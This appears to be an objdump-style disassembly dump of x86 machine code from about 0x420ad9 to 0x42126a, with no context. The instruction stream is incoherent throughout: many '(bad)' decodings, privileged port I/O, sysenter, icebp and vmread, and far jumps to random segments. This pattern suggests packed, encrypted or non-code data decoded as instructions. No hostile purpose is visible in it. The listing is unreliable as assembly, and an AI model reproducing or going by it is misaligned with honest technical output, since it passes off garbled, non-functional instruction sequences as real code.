  420ad9:	pop    ebp
  420ada:	xchg   ebx,eax
  420adb:	xor    DWORD PTR [esi-0x3e],edx
  420ade:	dec    ebp
  420adf:	or     ch,dh
  420ae1:	mov    ebp,0xb912ea56
  420ae6:	pusha  
  420ae7:	xchg   esp,eax
  420ae8:	dec    esi
  420ae9:	xor    DWORD PTR [esi-0x6d61c232],0xbd7e9df7
  420af3:	test   al,0x92
  420af5:	sahf   
  420af6:	xchg   edi,eax
  420af7:	push   ds
  420af8:	mov    edi,0x34d098f9
  420afd:	out    dx,al
  420afe:	loope  0x420b62
  420b00:	sysenter 
  420b02:	lahf   
  420b03:	mov    ch,dl
  420b05:	scas   al,BYTE PTR es:[edi]
  420b06:	aas    
  420b07:	(bad)  
  420b08:	daa    
  420b09:	pop    ebp
  420b0a:	and    BYTE PTR [edx],0x63
  420b0d:	add    al,0x4a
  420b0f:	pop    esi
  420b10:	cmp    eax,0x1923c6a7
  420b15:	imul   esp,DWORD PTR [ecx],0x49294807
  420b1b:	mov    bl,0x45
  420b1d:	push   eax
  420b1e:	fwait
  420b1f:	jmp    0x4641:0x1b783825
  420b26:	call   0xee35b3e2
  420b2b:	mov    eax,ds:0x8fd6b45b
  420b30:	je     0x420b93
  420b32:	jecxz  0x420b30
  420b34:	retf   0x2aa4
  420b37:	or     DWORD PTR [ebp-0x71591e5f],0xb4f3dfb
  420b41:	int    0xce
  420b43:	loop   0x420bbe
  420b45:	push   0x37e24fd9
  420b4a:	xchg   esp,eax
  420b4b:	xchg   edi,eax
  420b4c:	pop    ds
  420b4d:	in     al,0x2b
  420b4f:	jne    0x420b6b
  420b51:	push   eax
  420b52:	sub    DWORD PTR [edx],esp
  420b54:	xchg   esi,eax
  420b55:	xchg   ecx,eax
  420b56:	and    ebx,esp
  420b58:	mov    bl,BYTE PTR [eiz*2-0x6d197565]
  420b5f:	pop    edx
  420b60:	icebp  
  420b61:	xchg   DWORD PTR [eax+esi*1],esi
  420b64:	loopne 0x420bd8
  420b66:	cli    
  420b67:	mov    al,0xfc
  420b69:	cmp    al,0x91
  420b6b:	gs inc ebx
  420b6d:	lahf   
  420b6e:	cld    
  420b6f:	add    ebx,0xd658b56d
  420b75:	data16 add dl,BYTE PTR [eax]
  420b78:	mov    al,0xa2
  420b7a:	adc    BYTE PTR [ecx],bh
  420b7c:	push   esi
  420b7d:	sbb    al,0x62
  420b7f:	test   bl,bh
  420b81:	push   ds
  420b82:	push   es
  420b83:	pop    ebx
  420b84:	icebp  
  420b85:	rcr    esp,0xf5
  420b88:	jmp    ebx
  420b8a:	(bad)  [esi-0x1964e2c1]
  420b90:	mov    bl,0xc3
  420b92:	pop    eax
  420b93:	mov    eax,ds:0x4390e64c
  420b98:	bound  ecx,QWORD PTR [eax-0x1f]
  420b9b:	add    eax,DWORD PTR [eax]
  420b9d:	and    eax,0x8e5f52e8
  420ba2:	jne    0x420b28
  420ba4:	icebp  
  420ba5:	nop
  420ba6:	je     0x420c04
  420ba8:	or     BYTE PTR [eax-0x3b536924],0x7
  420baf:	pop    eax
  420bb0:	adc    al,0xea
  420bb2:	xor    esi,DWORD PTR [ebp-0x56]
  420bb5:	(bad)  
  420bb6:	rcl    BYTE PTR [edi],0x74
  420bb9:	out    0x13,al
  420bbb:	fldpi  
  420bbd:	cmp    ch,BYTE PTR [ecx]
  420bbf:	inc    ebx
  420bc0:	aas    
  420bc1:	xchg   DWORD PTR [ebx],ebp
  420bc3:	adc    eax,DWORD PTR [esi-0x1e]
  420bc6:	or     al,0xba
  420bc9:	and    DWORD PTR ds:0x9c272e9e,esp
  420bcf:	push   es
  420bd0:	xchg   BYTE PTR [esi+0x14],bl
  420bd3:	or     eax,0xba96310e
  420bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bd9:	mov    al,ds:0x313f6295
  420bde:	xchg   ecx,eax
  420bdf:	scas   eax,DWORD PTR es:[edi]
  420be0:	mov    ah,0x1f
  420be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420be3:	jbe    0x420b90
  420be5:	scas   al,BYTE PTR es:[edi]
  420be6:	cmp    BYTE PTR [ebx-0x71587bbf],ah
  420bec:	in     eax,dx
  420bed:	fild   WORD PTR [edx]
  420bef:	std    
  420bf0:	mov    es,WORD PTR [eax-0x9599cc9]
  420bf6:	ins    DWORD PTR es:[edi],dx
  420bf7:	push   edi
  420bf8:	push   ebx
  420bf9:	mov    ds:0x1d438e9c,al
  420bfe:	push   eax
  420bff:	pop    ss
  420c00:	bound  eax,QWORD PTR [ebp-0xe7a52f4]
  420c06:	jae    0x420c24
  420c08:	mov    esp,0x877eaa30
  420c0d:	loop   0x420bbf
  420c0f:	lea    eax,[edx+0x16]
  420c12:	jp     0x420bfc
  420c14:	(bad)  
  420c15:	adc    bl,BYTE PTR [esi-0x20bbf8f8]
  420c1b:	in     al,0x8a
  420c1d:	add    bh,BYTE PTR [ecx-0x2b]
  420c20:	xor    DWORD PTR [ebp-0x30],0x6d
  420c24:	dec    edi
  420c25:	fs or  al,0xe3
  420c28:	dec    esp
  420c29:	jae    0x420c39
  420c2b:	xor    BYTE PTR [edi],0x35
  420c2e:	cmp    DWORD PTR [esi-0x58],esp
  420c31:	fild   WORD PTR [edx-0x31]
  420c34:	inc    edi
  420c35:	repnz std 
  420c37:	out    0x4f,eax
  420c39:	arpl   WORD PTR [esi-0x74],di
  420c3c:	add    eax,0x8feebb9e
  420c41:	or     BYTE PTR [ecx+0x78],0x90
  420c45:	popf   
  420c46:	mov    esi,DWORD PTR [edx+0xa4645b3]
  420c4c:	inc    ebx
  420c4d:	sub    DWORD PTR [ecx-0x167c8926],esi
  420c53:	mov    al,0xd4
  420c55:	xchg   BYTE PTR [esi+0x3a85589d],ah
  420c5b:	jns    0x420be9
  420c5d:	lods   eax,DWORD PTR ds:[esi]
  420c5e:	push   edx
  420c5f:	fs pop edx
  420c61:	dec    ecx
  420c62:	jmp    0x420c37
  420c64:	cmp    bl,BYTE PTR [eax+ebx*4]
  420c67:	lea    edx,[eax]
  420c69:	retf   
  420c6a:	pop    edx
  420c6b:	pop    esp
  420c6c:	in     eax,0xd3
  420c6e:	test   eax,0x9c9cd113
  420c73:	sbb    al,0x9c
  420c75:	xchg   edi,eax
  420c76:	xchg   ebp,eax
  420c77:	icebp  
  420c78:	stc    
  420c79:	inc    ebp
  420c7a:	nop
  420c7b:	adc    ebx,esi
  420c7d:	or     ebx,DWORD PTR [esi+0x25]
  420c80:	and    eax,0x65f9253e
  420c85:	imul   eax,DWORD PTR [eax+0x1f],0xdef910c5
  420c8c:	retf   
  420c8d:	jmp    0x801f7367
  420c92:	(bad)  
  420c93:	push   ss
  420c94:	adc    eax,0x177fbabd
  420c99:	(bad)  
  420c9a:	adc    al,0x89
  420c9c:	fnstsw WORD PTR [eax]
  420c9e:	mov    ah,BYTE PTR [edx]
  420ca0:	data16 add al,0x3b
  420ca3:	int3   
  420ca4:	ds add eax,0x5cb37739
  420caa:	mov    eax,?
  420cac:	jb     0x420c5b
  420cae:	mov    bh,0xd
  420cb0:	les    esp,FWORD PTR [eax+0x561b4527]
  420cb6:	test   eax,0x9e8c4cb4
  420cbb:	fcomp  DWORD PTR [eax]
  420cbd:	stos   BYTE PTR es:[edi],al
  420cbe:	push   ebx
  420cbf:	jb     0x420cfd
  420cc1:	test   al,0xdc
  420cc3:	or     al,0x4
  420cc5:	frstpm(287 only) 
  420cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cc8:	mov    al,0xf8
  420cca:	loopne 0x420c65
  420ccc:	ins    BYTE PTR es:[edi],dx
  420ccd:	or     eax,0x5aba461f
  420cd2:	pop    eax
  420cd3:	neg    DWORD PTR [esp+ebp*8-0x30]
  420cd7:	cli    
  420cd8:	sbb    eax,esi
  420cda:	sub    bl,dl
  420cdc:	xor    DWORD PTR [edi],eax
  420cde:	imul   ebp,DWORD PTR [edx+0x35],0xaa217c1a
  420ce5:	cmp    al,0x10
  420ce7:	add    eax,edi
  420ce9:	repnz or ah,bl
  420cec:	in     al,0x66
  420cee:	fistp  QWORD PTR [edi+0x5c]
  420cf1:	push   edx
  420cf2:	adc    DWORD PTR [eax],esp
  420cf4:	inc    eax
  420cf5:	xchg   DWORD PTR [esi+edi*8-0x386b39c6],ebp
  420cfc:	test   eax,0xddd16ccc
  420d01:	data16 mov ch,0x5c
  420d04:	(bad)  
  420d05:	xlat   BYTE PTR ds:[ebx]
  420d06:	shl    eax,1
  420d08:	pop    ecx
  420d09:	add    bl,dl
  420d0b:	lahf   
  420d0c:	ja     0x420d05
  420d0e:	jae    0x420cc2
  420d10:	cmp    esi,edx
  420d12:	mov    esp,0x391140b1
  420d17:	dec    esp
  420d18:	shl    BYTE PTR [eax+eiz*1-0x336cd93],cl
  420d1f:	jb     0x420d74
  420d21:	hlt    
  420d22:	xor    edx,ebx
  420d24:	es pop esp
  420d26:	std    
  420d27:	sub    al,0xb2
  420d29:	(bad)  
  420d2a:	(bad)  
  420d2b:	lock out dx,al
  420d2d:	add    al,0x48
  420d2f:	in     al,dx
  420d30:	push   ds
  420d31:	mov    ah,0xba
  420d33:	fiadd  DWORD PTR [ebp+ebp*4+0x35]
  420d37:	sbb    al,0xdb
  420d39:	cmc    
  420d3a:	repnz push ecx
  420d3c:	sbb    al,al
  420d3e:	fcomi  st,st(2)
  420d40:	pop    esp
  420d41:	in     eax,0x43
  420d43:	inc    ecx
  420d44:	dec    esi
  420d45:	outs   dx,BYTE PTR ds:[esi]
  420d46:	(bad)  
  420d47:	outs   dx,BYTE PTR ds:[esi]
  420d48:	iret   
  420d49:	repnz rcr BYTE PTR [ebx],cl
  420d4c:	es into 
  420d4e:	nop
  420d4f:	xchg   edx,eax
  420d50:	adc    DWORD PTR [ecx+0x34],0xffffffc2
  420d54:	fisttp WORD PTR [esp+eax*4-0x4e0292fd]
  420d5b:	dec    eax
  420d5c:	cmc    
  420d5d:	add    BYTE PTR [edx+edi*4+0x64],dl
  420d61:	mov    dl,0xd
  420d63:	mov    BYTE PTR [edi+0x72],bh
  420d66:	dec    edx
  420d67:	sbb    bh,BYTE PTR [edi+0x44cf2ca7]
  420d6d:	adc    bl,BYTE PTR [edx-0x49]
  420d70:	dec    esi
  420d71:	jecxz  0x420dde
  420d73:	dec    edx
  420d74:	mov    ecx,0xadfb3ac7
  420d79:	loopne 0x420d3a
  420d7b:	retf   
  420d7c:	(bad)  
  420d7d:	fadd   st,st(1)
  420d7f:	dec    edx
  420d80:	push   ds
  420d81:	and    ebp,eax
  420d83:	add    al,0x7d
  420d85:	mov    dh,0xa6
  420d87:	(bad)  
  420d89:	leave  
  420d8a:	(bad)  
  420d8b:	hlt    
  420d8c:	fimul  WORD PTR [ecx-0x45b70822]
  420d92:	(bad)  
  420d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d94:	adc    edx,DWORD PTR [edi+ebx*1-0x13de1bd3]
  420d9b:	inc    edx
  420d9c:	mov    ds:0x5e726eaa,eax
  420da1:	gs test BYTE PTR cs:[ebx],0x26
  420da6:	jmp    0x420d4c
  420da8:	dec    ebp
  420da9:	ins    DWORD PTR es:[edi],dx
  420daa:	sbb    BYTE PTR [edx-0x5e47a213],bh
  420db0:	pop    ebp
  420db1:	adc    BYTE PTR [eax+0x1],0x46
  420db5:	push   edx
  420db6:	xchg   BYTE PTR [eax+0x65f039f6],dl
  420dbc:	gs jmp 0x95afc212
  420dc2:	or     BYTE PTR [esi],bl
  420dc4:	ret    
  420dc5:	push   ds
  420dc6:	xor    eax,0xd43853df
  420dcb:	pop    edi
  420dcc:	inc    esp
  420dcd:	pop    ecx
  420dce:	xlat   BYTE PTR ds:[ebx]
  420dcf:	lds    ebx,FWORD PTR [edx]
  420dd1:	mov    dh,0x7f
  420dd3:	gs (bad) 
  420dd5:	pop    esp
  420dd6:	xchg   edi,eax
  420dd7:	mov    dh,0xf
  420dd9:	hlt    
  420dda:	and    DWORD PTR ds:[ebx],eax
  420ddd:	jg     0x420e4b
  420ddf:	mov    ds:0x6e6454f2,al
  420de4:	ror    DWORD PTR ss:[eax],1
  420de7:	loop   0x420e2f
  420de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dea:	(bad)  [eax-0x46ad5ca3]
  420df0:	arpl   WORD PTR ds:0x7426aa37,cx
  420df6:	or     al,0xf5
  420df8:	inc    ebx
  420df9:	std    
  420dfa:	out    0xd1,al
  420dfc:	push   edi
  420dfd:	out    0xc1,al
  420dff:	lods   eax,DWORD PTR ds:[esi]
  420e00:	mov    cl,0x56
  420e02:	mov    dh,0x3c
  420e04:	scas   al,BYTE PTR es:[edi]
  420e05:	and    BYTE PTR [edi*4-0x1f9dd545],dh
  420e0c:	cmp    DWORD PTR ds:0x9c2ca6a8,0x9479823
  420e16:	mov    cl,0xfb
  420e18:	call   0x36061949
  420e1d:	hlt    
  420e1e:	hlt    
  420e1f:	mov    dh,0x86
  420e21:	pop    ds
  420e22:	jnp    0x420de6
  420e24:	or     eax,DWORD PTR [ecx-0x3d]
  420e27:	sti    
  420e28:	rol    BYTE PTR [ebx-0x17d454f7],0xe3
  420e2f:	stc    
  420e30:	(bad)  
  420e31:	xor    esi,ebx
  420e33:	es loope 0x420e45
  420e36:	in     eax,0xa2
  420e38:	fstp   DWORD PTR [ebp+0x42]
  420e3b:	xchg   esp,eax
  420e3c:	dec    ebx
  420e3d:	or     DWORD PTR [esi+edi*8],esp
  420e40:	xchg   ebx,eax
  420e41:	push   edi
  420e42:	hlt    
  420e43:	test   esp,ebx
  420e45:	or     DWORD PTR [edi+0x2],esp
  420e48:	in     al,0xad
  420e4a:	jbe    0x420df6
  420e4c:	out    dx,eax
  420e4d:	sbb    BYTE PTR [esp+eax*2+0x596a806f],bl
  420e54:	mov    eax,0x11c8fbd5
  420e59:	jl     0x420e51
  420e5b:	pop    edx
  420e5c:	and    edi,DWORD PTR ds:0xcd0023f
  420e62:	dec    ecx
  420e63:	outs   dx,BYTE PTR ds:[esi]
  420e64:	mov    edx,0x80808dd0
  420e69:	mov    DWORD PTR [ebx],ecx
  420e6b:	leave  
  420e6c:	jmp    0x420e61
  420e6e:	gs cmp al,0x0
  420e71:	xchg   esp,eax
  420e72:	repnz mov ds:0x403f38ca,al
  420e78:	pop    ds
  420e79:	and    DWORD PTR [esi+0x52],esi
  420e7c:	xchg   ebx,eax
  420e7d:	xchg   ebp,eax
  420e7e:	xchg   ebp,eax
  420e7f:	out    0x36,al
  420e81:	jp     0x420e16
  420e83:	jl     0x420ece
  420e85:	fiadd  WORD PTR [eax+0x2]
  420e88:	mov    cs,WORD PTR [edx-0x69]
  420e8b:	mov    ds:0x9cdd12e8,eax
  420e90:	ret    
  420e91:	pop    ebx
  420e92:	jmp    DWORD PTR [ebx+ebx*1]
  420e95:	pop    ebp
  420e96:	mov    cl,0xda
  420e98:	mov    ecx,0x84ebf62f
  420e9d:	scas   eax,DWORD PTR es:[edi]
  420e9e:	imul   BYTE PTR [edx+ecx*2+0x371cefd0]
  420ea5:	or     al,0xd8
  420ea7:	ds pop esi
  420ea9:	or     dh,BYTE PTR ds:0x3cf8b0df
  420eaf:	mov    al,ds:0x5ed175a5
  420eb4:	lods   eax,DWORD PTR ds:[esi]
  420eb5:	cmc    
  420eb6:	xor    DWORD PTR [ecx+0x4fb951a0],eax
  420ebc:	lea    ecx,[ebx+0x42cfe5fd]
  420ec2:	jmp    0xbf06aaca
  420ec7:	call   0x1d91f5f3
  420ecc:	xchg   BYTE PTR [eax+0x693751bd],ch
  420ed2:	mov    ecx,0xf8686f1c
  420ed7:	push   es
  420ed8:	and    BYTE PTR [ecx-0x55],ah
  420edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420edc:	cmp    bl,ah
  420ede:	or     al,0xf6
  420ee0:	dec    ebp
  420ee1:	ror    BYTE PTR [ebx+0x7f],1
  420ee4:	jmp    0xdfc341a3
  420ee9:	es in  al,dx
  420eeb:	out    0xd4,al
  420eed:	sbb    dl,BYTE PTR [ebx+0x3ae2de09]
  420ef3:	inc    ebp
  420ef4:	imul   esp,DWORD PTR [esi+0x10],0x9
  420ef8:	clc    
  420ef9:	dec    esp
  420efa:	jg     0x420eb7
  420efc:	int    0x46
  420efe:	clc    
  420eff:	mov    ds:0x8732eb2e,eax
  420f04:	inc    ebx
  420f05:	mov    ah,0x7
  420f07:	vmread DWORD PTR [edi],edi
  420f0a:	mov    eax,0x9738479b
  420f0f:	dec    edi
  420f10:	mov    WORD PTR [edx+eiz*4],?
  420f13:	jge    0x420f49
  420f15:	mov    eax,0xd5d26dde
  420f1a:	sahf   
  420f1b:	repnz push edi
  420f1d:	(bad)  
  420f1e:	inc    esi
  420f1f:	cs test edi,ebp
  420f22:	inc    sp
  420f24:	lods   eax,DWORD PTR ds:[esi]
  420f25:	mov    bh,0x19
  420f27:	xor    edi,ebp
  420f29:	cwde   
  420f2a:	and    BYTE PTR [edi+0x2a339782],bl
  420f30:	xor    eax,0xc7b493d1
  420f35:	ror    DWORD PTR [esi-0x21],cl
  420f38:	test   al,0xc2
  420f3a:	push   0x34
  420f3c:	and    dl,BYTE PTR [edx-0x20]
  420f3f:	stos   BYTE PTR es:[edi],al
  420f40:	jmp    DWORD PTR [ebp-0x2e]
  420f43:	mov    esi,0xbbe154ac
  420f48:	pop    ss
  420f49:	cmp    ecx,DWORD PTR [ebx+eax*4-0x1b]
  420f4d:	xor    al,BYTE PTR [edx]
  420f4f:	sbb    BYTE PTR [esi+0x358fe973],dl
  420f55:	pop    ecx
  420f56:	cmp    al,0x41
  420f58:	(bad)  
  420f59:	mov    eax,ds:0x5578ade0
  420f5e:	repnz mov edx,eax
  420f61:	pop    ebp
  420f62:	inc    edi
  420f63:	ja     0x420f09
  420f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f66:	sub    al,0xb3
  420f68:	inc    eax
  420f69:	cdq    
  420f6a:	(bad)  
  420f6b:	mov    edi,0x43dbe5fa
  420f70:	or     al,0xa8
  420f72:	add    al,0x6a
  420f74:	add    ebx,DWORD PTR [ecx]
  420f76:	jnp    0x420fec
  420f78:	test   al,0x9f
  420f7a:	push   ebp
  420f7b:	xchg   ebx,eax
  420f7c:	xchg   ebp,eax
  420f7d:	icebp  
  420f7e:	xchg   ebx,eax
  420f7f:	push   esp
  420f80:	push   ds
  420f81:	and    eax,edx
  420f83:	rcl    BYTE PTR [ebx-0xb],1
  420f86:	sub    BYTE PTR [edx+eax*1],0xc8
  420f8a:	bound  eax,QWORD PTR [ebx]
  420f8c:	push   ebx
  420f8d:	jne    0x420f7d
  420f8f:	retf   0x6642
  420f92:	mov    BYTE PTR [ecx-0x1c],bh
  420f95:	lea    ecx,[esi+0x4123986f]
  420f9b:	cmc    
  420f9c:	scas   eax,DWORD PTR es:[edi]
  420f9d:	das    
  420f9e:	leave  
  420f9f:	inc    edi
  420fa0:	cld    
  420fa1:	push   cs
  420fa2:	mul    DWORD PTR [edi]
  420fa4:	addr16 jmp 0x420fbd
  420fa7:	(bad)  
  420fa8:	sub    al,0x69
  420faa:	ret    0xa878
  420fad:	pop    ecx
  420fae:	mov    esi,eax
  420fb0:	pop    ebp
  420fb1:	rcl    cl,0x35
  420fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fb5:	fcom   st(1)
  420fb7:	sub    ch,BYTE PTR [ecx-0x39]
  420fba:	lahf   
  420fbb:	pop    edi
  420fbc:	test   al,0x8f
  420fbe:	jmp    0xa92f61aa
  420fc3:	adc    al,0xde
  420fc5:	daa    
  420fc6:	push   ss
  420fc7:	arpl   dx,si
  420fc9:	addr16 je 0x420f9e
  420fcc:	sbb    cl,BYTE PTR [edi]
  420fce:	dec    esp
  420fcf:	leave  
  420fd0:	mov    eax,ds:0x6b9678e6
  420fd5:	inc    eax
  420fd6:	dec    ecx
  420fd7:	push   es
  420fd8:	mov    edi,0x3d6a0237
  420fdd:	xor    DWORD PTR [eax],eax
  420fdf:	add    DWORD PTR [ebx+edx*4+0x20],eax
  420fe3:	pop    edi
  420fe4:	stc    
  420fe5:	push   esp
  420fe6:	sahf   
  420fe7:	jb     0x420ff0
  420fe9:	pop    esi
  420fea:	push   esp
  420feb:	push   ss
  420fec:	jns    0x42101c
  420fee:	push   ds
  420fef:	retf   0x14f5
  420ff2:	add    edx,DWORD PTR [ebp-0x55]
  420ff5:	ins    DWORD PTR es:[edi],dx
  420ff6:	jmp    0x421037
  420ff8:	cmp    al,0xd7
  420ffa:	in     al,0x48
  420ffc:	enter  0x1e4d,0xe5
  421000:	sub    ebx,DWORD PTR [edi+0x56]
  421003:	mov    ebp,0x7bf7a282
  421008:	fcom   st(0)
  42100a:	dec    esi
  42100b:	cli    
  42100c:	jnp    0x420f97
  42100e:	int    0xa1
  421010:	popa   
  421011:	cmp    DWORD PTR [ebp-0xe],edx
  421014:	mov    ebp,DWORD PTR [edx]
  421016:	fstp   QWORD PTR [esi]
  421018:	out    0x8c,al
  42101a:	in     eax,dx
  42101b:	or     eax,0x813cb5a1
  421020:	add    DWORD PTR [edi+0x4cf7254e],esp
  421026:	mov    esi,0x54f85332
  42102b:	out    dx,al
  42102c:	ja     0x4210a3
  42102e:	lods   al,BYTE PTR ds:[esi]
  42102f:	or     eax,0xd1b6b81e
  421034:	inc    ebx
  421035:	sub    al,0x7c
  421037:	test   DWORD PTR [esi+edx*8],ebx
  42103a:	(bad)  
  42103b:	outs   dx,DWORD PTR ds:[esi]
  42103c:	add    edi,esi
  42103e:	pushf  
  42103f:	out    0x55,eax
  421041:	add    DWORD PTR [esi+ebp*1+0x31],0x883f5811
  421049:	in     al,dx
  42104a:	push   ss
  42104b:	mov    DWORD PTR [eax-0x4529ba62],eax
  421051:	shl    BYTE PTR [ebx-0x2d26d9f2],1
  421057:	or     DWORD PTR [ebp-0x38a27487],edx
  42105d:	pusha  
  42105e:	xor    BYTE PTR [esi],dh
  421060:	(bad)
  421064:	mov    esp,0xaa9fb041
  421069:	and    ebp,DWORD PTR [ebp-0x9b44407]
  42106f:	shr    BYTE PTR [ebx+0x20fbf6dd],1
  421075:	xor    eax,0xbbb9e3fb
  42107a:	std    
  42107b:	pop    ds
  42107c:	dec    esp
  42107d:	outs   dx,BYTE PTR ds:[esi]
  42107e:	cmp    ecx,DWORD PTR [edx]
  421080:	add    BYTE PTR [esi-0x3c994d44],0x95
  421087:	lods   eax,DWORD PTR ds:[esi]
  421088:	add    bh,BYTE PTR [edx]
  42108a:	rcr    BYTE PTR [edx-0x4e90965e],1
  421090:	sbb    ah,BYTE PTR [edx+0x41b8ca16]
  421096:	add    eax,DWORD PTR [ebx-0x45]
  421099:	or     bh,BYTE PTR [ebx+0x1e41af13]
  42109f:	daa    
  4210a0:	rcr    BYTE PTR [edi-0x954a4ac],cl
  4210a6:	dec    ebx
  4210a7:	or     esi,esp
  4210a9:	int    0xe6
  4210ab:	mov    ds:0xb727bda4,eax
  4210b0:	jge    0x421060
  4210b2:	test   BYTE PTR [ecx+eax*8],0xcb
  4210b6:	mov    esi,0x3dcb03a2
  4210bb:	(bad)  [eax+edi*4+0x3a]
  4210bf:	jl     0x421110
  4210c1:	jg     0x4210c5
  4210c3:	mov    bl,0x4f
  4210c5:	dec    edi
  4210c6:	and    edx,DWORD PTR [edi]
  4210c8:	dec    esi
  4210c9:	les    ebx,FWORD PTR [ebx+0xd940e18]
  4210cf:	popa   
  4210d0:	push   ss
  4210d1:	cmp    eax,0x134ec74e
  4210d6:	fs in  al,dx
  4210d8:	pop    es
  4210d9:	mov    cl,0xe6
  4210db:	les    eax,FWORD PTR [ebx]
  4210dd:	fisttp QWORD PTR [eax+0x52f87080]
  4210e3:	mov    dl,0x54
  4210e5:	xchg   ecx,eax
  4210e6:	push   esi
  4210e7:	icebp  
  4210e8:	push   edi
  4210e9:	hlt    
  4210ea:	jae    0x421090
  4210ec:	jne    0x42113f
  4210ee:	pushf  
  4210ef:	out    dx,al
  4210f0:	inc    esp
  4210f1:	mov    ebx,0x49de1b8e
  4210f6:	pushf  
  4210f7:	in     eax,dx
  4210f8:	inc    eax
  4210f9:	lahf   
  4210fa:	push   edx
  4210fb:	mov    cl,0x51
  4210fd:	int3   
  4210fe:	sbb    dl,ch
  421100:	cdq    
  421101:	js     0x42114f
  421103:	add    eax,DWORD PTR [esi]
  421105:	js     0x4210d9
  421107:	adc    al,0xb
  421109:	jl     0x4210c6
  42110b:	cs jbe 0x421183
  42110e:	push   edi
  42110f:	mov    edx,0x8f99d1ed
  421114:	cmp    ch,BYTE PTR [esi+eiz*4]
  421117:	and    dl,BYTE PTR [esi]
  421119:	xchg   esp,eax
  42111a:	cmp    eax,0x1ae7bea4
  42111f:	and    esi,DWORD PTR [ebp+0x5b536ec]
  421125:	sub    al,0x61
  421127:	enter  0x5ae0,0x87
  42112b:	jmp    FWORD PTR [edx-0x77]
  42112e:	mov    cs,WORD PTR [ecx-0x72]
  421131:	out    0x77,al
  421133:	push   0x55397dcc
  421138:	push   ss
  421139:	or     ah,BYTE PTR [edi+ebx*1]
  42113c:	xor    edx,DWORD PTR [ecx+0x1af7c358]
  421142:	xchg   esi,eax
  421143:	in     eax,dx
  421144:	ss repz jnp 0x4210e3
  421148:	add    DWORD PTR [eax],ebx
  42114a:	nop
  42114b:	ss scas al,BYTE PTR es:[edi]
  42114d:	jnp    0x421180
  42114f:	in     al,0x25
  421151:	mov    bh,0x44
  421153:	mov    ah,0x5c
  421155:	adc    eax,edx
  421157:	sbb    BYTE PTR [ecx-0x7d],ah
  42115a:	push   edx
  42115b:	aam    0x33
  42115d:	push   ds
  42115e:	dec    ebp
  42115f:	fdiv   QWORD PTR [eax+0x62]
  421162:	mov    DWORD PTR [edi+0x302a650a],eax
  421168:	push   cs
  421169:	daa    
  42116a:	xchg   edx,eax
  42116b:	ret    0x8fc9
  42116e:	fwait
  42116f:	dec    ebx
  421170:	arpl   WORD PTR [esp+ecx*8-0x5358c6a5],bp
  421177:	ja     0x421153
  421179:	int3   
  42117a:	mov    WORD PTR [ebx+0x52],ss
  42117d:	mov    bl,0x4f
  42117f:	out    0xc8,al
  421181:	mul    dl
  421183:	cmp    ah,bh
  421185:	fs pop edx
  421187:	fstp   QWORD PTR [edi+0xcac3fa1]
  42118d:	ret    
  42118e:	lea    esp,[esi-0x25]
  421191:	dec    ecx
  421192:	les    eax,FWORD PTR [ebp+0x66]
  421195:	test   DWORD PTR [edx+ebx*2+0x67f4458c],edx
  42119c:	xor    cl,bl
  42119e:	pop    es
  42119f:	fsub   QWORD PTR [ebx]
  4211a1:	sti    
  4211a2:	mov    al,0x21
  4211a4:	pop    ss
  4211a5:	in     eax,dx
  4211a6:	stos   BYTE PTR es:[edi],al
  4211a7:	sbb    DWORD PTR [edi+0x7a775e2],ebx
  4211ad:	mov    ch,0x3
  4211af:	outs   dx,BYTE PTR ds:[esi]
  4211b0:	outs   dx,DWORD PTR ds:[esi]
  4211b1:	adc    BYTE PTR ds:0xdf026caf,cl
  4211b7:	inc    edi
  4211b8:	(bad)  
  4211b9:	mov    edi,0x81946c19
  4211be:	mov    ax,0x9598
  4211c2:	mov    cl,0x9e
  4211c4:	dec    ebx
  4211c5:	fisub  WORD PTR [eax+0x9]
  4211c8:	dec    BYTE PTR [ebx]
  4211ca:	call   0x80b3fb68
  4211cf:	jo     0x4211a5
  4211d1:	lock out 0x5,al
  4211d4:	mov    ecx,0xc17969c7
  4211d9:	inc    ecx
  4211da:	outs   dx,BYTE PTR ds:[esi]
  4211db:	popf   
  4211dc:	mov    edi,0x559d09f6
  4211e1:	out    dx,al
  4211e2:	test   bl,al
  4211e4:	fsub   QWORD PTR [ebp-0x4bb78213]
  4211ea:	mov    eax,ds:0x4c7fdd48
  4211ef:	ins    DWORD PTR es:[edi],dx
  4211f0:	push   es
  4211f1:	aam    0x78
  4211f3:	ss (bad) 
  4211f5:	dec    esp
  4211f6:	jb     0x421204
  4211f8:	sub    ebp,DWORD PTR [ebx+esi*1]
  4211fb:	mov    esi,DWORD PTR [ecx]
  4211fd:	jmp    0x4211d1
  4211ff:	loop   0x421241
  421201:	mov    BYTE PTR [edi],0xf2
  421204:	cmp    al,0x6d
  421206:	test   al,0xd5
  421208:	inc    ebx
  421209:	mov    ds:0x488a9914,eax
  42120e:	repz push ecx
  421210:	retf   
  421211:	inc    edx
  421212:	popa   
  421213:	adc    DWORD PTR [ecx+edi*2-0x791bbb2c],edx
  42121a:	fisttp QWORD PTR ds:0x1c7dc4ba
  421220:	push   edi
  421221:	jmp    0x2a21:0xb6055a09
  421228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421229:	(bad)  
  42122b:	call   0xe1263a52
  421230:	add    cl,BYTE PTR [ebx-0x35]
  421233:	mov    DWORD PTR [edx],edx
  421235:	push   esi
  421236:	fist   WORD PTR [eax+0x598ffd41]
  42123c:	jne    0x4211f5
  42123e:	in     al,0x59
  421240:	jmp    0x4211d0
  421242:	sti    
  421243:	dec    eax
  421244:	jbe    0x4211cb
  421246:	xor    dh,ch
  421248:	lock add eax,0x856e4cc3
  42124e:	nop
  42124f:	jbe    0x4211dc
  421251:	push   ss
  421252:	rol    DWORD PTR [ebx],cl
  421254:	push   edi
  421255:	xchg   edx,eax
  421256:	adc    ah,ch
  421258:	and    dl,BYTE PTR [edi]
  42125a:	adc    al,0x48
  42125c:	mov    ah,0x90
  42125e:	fisubr DWORD PTR [ecx]
  421260:	inc    ecx
  421261:	dec    ebp
  421262:	sbb    al,0x23
  421264:	cwde   
  421265:	js     0x42128b
  421267:	jmp    ecx
  421269:	scas   al,BYTE PTR es:[edi]
  42126a:	and    eax,0xe7ba6604
